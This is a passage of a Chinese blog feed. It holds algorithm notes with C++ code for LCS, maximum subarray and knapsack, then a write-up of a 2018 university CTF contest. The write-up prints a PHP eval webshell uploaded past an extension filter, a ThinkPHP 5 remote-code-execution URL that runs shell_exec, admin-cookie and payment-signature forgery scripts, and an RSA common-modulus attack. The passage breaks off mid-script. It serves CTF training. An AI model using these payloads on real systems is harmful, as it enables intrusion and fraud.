class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=n;i++) c[<span class="number">0</span>][i] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(x[i]==y[j])&#123;</span><br><span class="line">				c[i][j] = c[i<span class="number">-1</span>][j<span class="number">-1</span>] + <span class="number">1</span>;</span><br><span class="line">				b[i][j] = <span class="number">1</span>;</span><br><span class="line">			&#125;<span class="keyword">else</span> <span class="keyword">if</span>(c[i<span class="number">-1</span>][j]&gt;c[i][j<span class="number">-1</span>])&#123;</span><br><span class="line">				c[i][j] = c[i<span class="number">-1</span>][j];</span><br><span class="line">				b[i][j] = <span class="number">2</span>;				</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				c[i][j] = c[i][j<span class="number">-1</span>];</span><br><span class="line">				b[i][j] = <span class="number">3</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//寻找最优解</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">traceback</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(i==<span class="number">-1</span>||j==<span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span>(b[i][j]==<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;x[i];</span><br><span class="line">		traceback(i<span class="number">-1</span>,j<span class="number">-1</span>);	</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(b[i][j]==<span class="number">2</span>) traceback(i<span class="number">-1</span>,j);</span><br><span class="line">	<span class="keyword">else</span> traceback(i,j<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;x&gt;&gt;y)&#123;</span><br><span class="line">		<span class="keyword">int</span> a = x.length();</span><br><span class="line">		<span class="keyword">int</span> b = y.length();</span><br><span class="line">		LCSLength(a,b);</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;c[a<span class="number">-1</span>][b<span class="number">-1</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		traceback(a<span class="number">-1</span>, b<span class="number">-1</span>);</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="最大字段和"><a href="#最大字段和" class="headerlink" title="最大字段和"></a>最大字段和</h2><blockquote>
<p>题目描述<br>给定n个整数组成的序列a1,a2,…an, 求子段和ai+ai+1+…+aj（子段可为空集）的最大值。</p>
<p>输入<br>包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=20)，代表测试数据个数。<br>每组测试数据第一行为一个整数n，代表有n个整数(1&lt;=n&lt;=10000)。<br>接下来一行有n个数x(-1000&lt;=x&lt;=1000)。</p>
<p>输出<br>输出其对应的最大子段和。</p>
</blockquote>
<p>递推公式</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">b</span>[i] = max&#123;<span class="selector-tag">b</span>[i-<span class="number">1</span>]+<span class="selector-tag">a</span>[i], <span class="selector-tag">a</span>[i]&#125;  (<span class="number">1</span>≤i≤n)</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> num[<span class="number">10005</span>];</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">//再给出输出最优解的方法</span></span><br><span class="line"><span class="keyword">int</span> temp_start,len;</span><br><span class="line"><span class="keyword">int</span> besti,bestj;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_res</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=besti;i&lt;bestj;i++)&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;num[i]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> t,n;</span><br><span class="line">	<span class="keyword">int</span> b = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> ans =<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">	<span class="keyword">while</span>(t&gt;<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;num[i];</span><br><span class="line">		&#125;</span><br><span class="line">		temp_start = <span class="number">0</span>;</span><br><span class="line">		len = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(b&gt;<span class="number">0</span>)&#123;</span><br><span class="line">				b = b + num[i];</span><br><span class="line">				len++;</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				b = num[i];</span><br><span class="line">				temp_start = i;</span><br><span class="line">				len = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(ans &lt; b)&#123;</span><br><span class="line">				ans = b;</span><br><span class="line">				besti = temp_start;</span><br><span class="line">				bestj = temp_start + len;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		<span class="comment">//get_res();</span></span><br><span class="line">		t--;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="矩阵连乘"><a href="#矩阵连乘" class="headerlink" title="矩阵连乘"></a>矩阵连乘</h2><p>待续</p>
<h2 id="0-1背包"><a href="#0-1背包" class="headerlink" title="0-1背包"></a>0-1背包</h2><blockquote>
<p>题目描述<br>已知有N种物品和一个可容纳C重量的背包。每种物品i的重量为Wi，价值为Pi。那么，采用怎样的装包方法才会使装入背包物品的总价值最大。</p>
<p>输入<br>包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=10)，代表测试数据个数。</p>
<p>接下来有T组测试数据。每组测试数据第一行为背包的重量C(C&lt;10000)和物品个数N(N&lt;1000)。接下来的N行分别为物品的重量cost(1&lt;=cost&lt;=100)和价值val(1&lt;=val&lt;=3000000)。（注意：结果可能超过int范围）</p>
<p>输出<br>对每组测试数据，输出其对应的所装物品的最大价值。</p>
</blockquote>
<p><img src="cumtctf/2.png" alt="递推公式"></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> c,n;</span><br><span class="line"><span class="keyword">int</span> x[<span class="number">1005</span>];</span><br><span class="line"><span class="keyword">long</span> w[<span class="number">1005</span>];</span><br><span class="line"><span class="keyword">long</span> v[<span class="number">1005</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> m[<span class="number">1005</span>][<span class="number">10005</span>];<span class="comment">//数组长度要开的合适一点</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pack</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;w[n];i++) m[n][i] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=w[n];i&lt;=c;i++) m[n][i] = v[n];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;w[i];j++) m[i][j] = m[i+<span class="number">1</span>][j];</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=w[i];j&lt;=c;j++)&#123;</span><br><span class="line">			m[i][j] = max(m[i+<span class="number">1</span>][j],m[i+<span class="number">1</span>][j-w[i]]+v[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//利用m的下标的意义来构造最优解 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">traceback</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(m[i][c]!=m[i+<span class="number">1</span>][c])&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;i&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">			c -= w[i];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> t;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">	<span class="keyword">while</span>(t--)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;c&gt;&gt;n;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) <span class="built_in">cin</span>&gt;&gt;w[i]&gt;&gt;v[i]; </span><br><span class="line">		pack();</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;m[<span class="number">1</span>][c]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		<span class="comment">//traceback();</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Record </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CUMTCTF第一轮月赛]]></title>
      <url>/2018/12/21/cumtctf2018/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2018校赛第一轮月赛记录，做的有点不好，看了题目感觉都不是很难，自己放弃的太快了。</p>
<a id="more"></a>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez-upload"></a>ez-upload</h2><p>题目要求不能上传 <code>.asp,.aspx,.php,.jsp</code> 文件，上传了jpg后缀不能用，尝试上传php5后缀，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//snow.php5</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'snow'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以上传并获得上传路径，菜刀连接一下</p>
<p><img src="cumtctf2018/1.png" alt=""></p>
<p><img src="cumtctf2018/2.png" alt=""></p>
<!-- flag{bd7096c6267e6aa8928249176b9cb1d0} -->
<h2 id="Cve"><a href="#Cve" class="headerlink" title="Cve~"></a>Cve<del>~</del></h2><p>这道题真的是做的难受，试了好多种方法，最终找到一个payload柳暗花明..</p>
<blockquote>
<p><a href="https://www.jianshu.com/p/7c410db788ed" target="_blank" rel="noopener">https://www.jianshu.com/p/7c410db788ed</a></p>
</blockquote>
<p>原理什么的就不细讲了，直接按照它说的操作就可以了，先看一下目录，根据前面的经验，估计又是在根目录下面</p>
<p><img src="cumtctf2018/4.png" alt=""></p>
<p>然后获取回显的formid</p>
<p><img src="cumtctf2018/5.png" alt=""></p>
<p><img src="cumtctf2018/6.png" alt=""></p>
<p><img src="cumtctf2018/7.png" alt=""></p>
<p><img src="cumtctf2018/8.png" alt=""></p>
<p><img src="cumtctf2018/9.png" alt=""></p>
<p><img src="cumtctf2018/10.png" alt=""></p>
<!-- flag{07381475a76a457743733bb828c19b3c} -->
<h2 id="tp5"><a href="#tp5" class="headerlink" title="tp5"></a>tp5</h2><p>题目给出了版本号，直接搜索一下对应的版本cve发现一篇文章</p>
<blockquote>
<p><a href="https://xz.aliyun.com/t/3570" target="_blank" rel="noopener">https://xz.aliyun.com/t/3570</a></p>
</blockquote>
<p>题目给出了利用代码，直接尝试一下发现可以回显phpinfo页面，修改参数即可</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.219.61.234:10005/public/index.php?s=/Index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func<span class="emphasis">_array&amp;vars[0]=shell_</span>exec&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=cat%20../../../../flag</span><br></pre></td></tr></table></figure>
<p><img src="cumtctf2018/3.png" alt=""></p>
<hr>
<p>接下里是web题目的复现</p>
<h2 id="secret-system"><a href="#secret-system" class="headerlink" title="secret_system"></a>secret_system</h2><p>扫描一下目录，可以找到登录页面，查看源代码可以看到提示</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">*** author: cib_zhinianyuxin.com</span></span><br><span class="line"><span class="comment">*** code: github.com</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问github仓库</p>
<p><img src="cumtctf2018/14.png" alt=""></p>
<p>题目给了test用户的登录密码，登录进去之后发现对应的cookie值，下一步就是伪造admin的cookie了，猜测admin的id应该为1，伪造一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sign = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'id'</span>=&gt;<span class="number">1</span>,</span><br><span class="line">    <span class="string">'name'</span>=&gt;<span class="string">"admin"</span>,</span><br><span class="line">    <span class="string">'sign'</span>=&gt;md5(<span class="string">"1"</span>.<span class="string">"admin"</span>),</span><br><span class="line">);  </span><br><span class="line">$s = urlencode(serialize($sign));</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br></pre></td></tr></table></figure>
<p>之后刷新即可以admin身份登录，之后就是上传webshell了，经过测试发现.pht后缀可以上传，上传即可getshell</p>
<h2 id="ezshop"><a href="#ezshop" class="headerlink" title="ezshop"></a>ezshop</h2><p>源码审计题目。开始没有思路，但是后面给了提示是签名伪造，查看源码在views.py中看到签名相关代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">form = &#123;</span><br><span class="line">        <span class="string">'order_id'</span>: o.id,</span><br><span class="line">        <span class="string">'buyer_id'</span>: o.user.id,</span><br><span class="line">        <span class="string">'good_id'</span>: o.good.id,</span><br><span class="line">        <span class="string">'buyer_point'</span>: o.user.profile.point,</span><br><span class="line">        <span class="string">'good_price'</span>: o.good.price,</span><br><span class="line">        <span class="string">'order_create_time'</span>: o.create_time.timestamp()</span><br><span class="line">    &#125;</span><br><span class="line">str2sign = RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + <span class="string">'&amp;'</span>.join([<span class="string">f'<span class="subst">&#123;i&#125;</span>=<span class="subst">&#123;form[i]&#125;</span>'</span> <span class="keyword">for</span> i <span class="keyword">in</span> form]).encode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="comment">#print(str2sign)</span></span><br><span class="line">sign = md5(str2sign).hexdigest()</span><br><span class="line"><span class="comment">#print(sign)</span></span><br><span class="line"><span class="keyword">return</span> render(request, <span class="string">'payment/confirm.html'</span>, &#123;<span class="string">'form'</span>: form, <span class="string">'sign'</span>: sign&#125;)</span><br></pre></td></tr></table></figure>
<p>可以看到签名的构造过程，我们可以尝试构造一个分数高于888分的用户的信息伪装成该用户购买flag就可以成功完成交易，因为题目并没有验证交易者身份，但是哪个用户可以用呢，通过查看db.sqlite3数据库文件可以看到</p>
<blockquote>
<p>id|user_id|point<br>13|16|30000<br>14|17|120</p>
</blockquote>
<p>用户id为16的用户有30000积分足够购买flag，所以构造签名即可，坑点在于秘钥为 <code>zhinianyuxin\n</code> 我就是没看到换行才导致没有做出来…还是自己太菜了，抓包修改签名值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">m = hashlib.md5()</span><br><span class="line">RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE = <span class="string">"zhinianyuxin\n"</span></span><br><span class="line">form = &#123;</span><br><span class="line">        <span class="string">'order_id'</span>: <span class="string">"219"</span>,</span><br><span class="line">        <span class="string">'buyer_id'</span>: <span class="string">"16"</span>,</span><br><span class="line">        <span class="string">'good_id'</span>: <span class="string">"38"</span>,</span><br><span class="line">        <span class="string">'buyer_point'</span>: <span class="string">"30000"</span>,</span><br><span class="line">        <span class="string">'good_price'</span>: <span class="string">"888"</span>,</span><br><span class="line">        <span class="string">'order_create_time'</span>: <span class="string">"1545145742.903019"</span></span><br><span class="line">    &#125;</span><br><span class="line">str2sign = RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + <span class="string">'&amp;'</span>.join([<span class="string">f'<span class="subst">&#123;i&#125;</span>=<span class="subst">&#123;form[i]&#125;</span>'</span> <span class="keyword">for</span> i <span class="keyword">in</span> form])</span><br><span class="line">m.update(str2sign.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">print(m.hexdigest())</span><br></pre></td></tr></table></figure>
<p>注意提交的时候相应的字段值也要修改一下，然后就可以看到flag了</p>
<p><img src="cumtctf2018/15.png" alt=""></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="现代密码签到题"><a href="#现代密码签到题" class="headerlink" title="现代密码签到题"></a>现代密码签到题</h2><p>题目很明显是共模攻击，但是密文编码格式一直不确定，base64,32等都没用，后面分析了一下频率，发现竟然只有10个字符！，按照外形对应一个0-9的数字，然后将文本转成10进制</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">"gbATZgI"</span></span><br><span class="line">ans = <span class="string">""</span></span><br><span class="line"><span class="comment"># dic = ['Z', 'T', 'O', 'B', 'I', 'S', 'A', 'b', 'g', 'E']</span></span><br><span class="line">dic = [<span class="string">'O'</span>, <span class="string">'I'</span>,<span class="string">'Z'</span>,<span class="string">'E'</span>,<span class="string">'A'</span>,<span class="string">'S'</span>,<span class="string">'b'</span>,<span class="string">'T'</span>,<span class="string">'B'</span>,<span class="string">'g'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">	ans += str(dic.index(i))</span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure>
<p>然后就是公模攻击了，网上找了个脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s,s2n</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	n = <span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></span><br><span class="line">	c1 = <span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></span><br><span class="line">	c2 = <span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></span><br><span class="line">	e1 = <span class="number">11187289</span></span><br><span class="line">	e2 = <span class="number">9647291</span></span><br><span class="line">	s = egcd(e1, e2)</span><br><span class="line">	s1 = s[<span class="number">1</span>]</span><br><span class="line">	s2 = s[<span class="number">2</span>]</span><br><span class="line">	<span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">    	s1 = - s1</span><br><span class="line">    	c1 = invert(c1, n)</span><br><span class="line"> 	<span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    	s2 = - s2</span><br><span class="line">    	c2 = invert(c2, n)</span><br><span class="line"> 	m = pow(c1,s1,n)*pow(c2,s2,n) % n</span><br><span class="line"> 	<span class="keyword">print</span> n2s(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  	main()</span><br></pre></td></tr></table></figure>
<!-- flag{49d91077a1abcb14f1a9d546c80be9ef} -->
<hr>
<p>下面是队友做出来的题目，一并记录一下</p>
<h2 id="古典密码签到题"><a href="#古典密码签到题" class="headerlink" title="古典密码签到题"></a>古典密码签到题</h2><p>​    由题目提示可知这题是棋盘密码，棋盘密码是多表代换，但并不知道加密所使用的密钥则无法进行解密。</p>
<p>根据所给的密文内容可知，密钥为k，s，y，n，b，个字符</p>
<div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th>k</th>
<th>s</th>
<th>y</th>
<th>n</th>
<th>b</th>
</tr>
</thead>
<tbody>
<tr>
<td>k</td>
<td>A</td>
<td>B</td>
<td>C</td>
<td>D</td>
<td>E</td>
</tr>
<tr>
<td>s</td>
<td>F</td>
<td>G</td>
<td>H</td>
<td>I/J</td>
<td>K</td>
</tr>
<tr>
<td>y</td>
<td>L</td>
<td>M</td>
<td>N</td>
<td>O</td>
<td>P</td>
</tr>
<tr>
<td>n</td>
<td>Q</td>
<td>R</td>
<td>S</td>
<td>T</td>
<td>U</td>
</tr>
<tr>
<td>b</td>
<td>V</td>
<td>W</td>
<td>X</td>
<td>Y</td>
<td>Z</td>
</tr>
</tbody>
</table>
</div>
<p>通过不断变换行列的k，s，y，n，b字符顺序进行爆破（其中行列字符顺序一致），找出含有关键字的明文消息。一共有5个字符的全排列，即5！种方式。</p>
<p>脚本参考<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/classical/polyalphabetic/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/crypto/classical/polyalphabetic/</a></p>
<p>通过itertools库中的permutations可实现对5个字符的全排列，固定密码表的内容。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">key = []</span><br><span class="line">cipher = <span class="string">"ksyssskkysynbssbbnynnb"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(<span class="string">'ksynb'</span>, <span class="number">5</span>):</span><br><span class="line">    key.append(<span 